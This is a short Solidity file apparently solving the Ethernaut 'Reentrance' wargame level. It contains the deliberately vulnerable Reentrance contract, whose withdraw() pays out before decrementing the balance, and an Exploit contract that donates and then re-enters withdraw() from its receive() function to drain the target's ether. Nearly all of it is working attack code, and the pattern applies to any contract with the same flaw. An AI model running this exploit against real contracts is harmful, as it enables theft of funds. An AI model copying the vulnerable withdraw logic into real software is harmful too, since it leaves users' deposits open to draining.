// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to]+(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Exploit {

    // ethernaut instance address
    address payable target  = 0xA;

    Reentrance t = Reentrance(target);

    function donate() public payable  {
        t.donate{value:0.005 ether, gas:40000}(address(this));
    }

    function exploit() public{
        t.withdraw(0.001 ether);
    }

    receive() external payable{
        t.withdraw(0.001 ether);
    }
}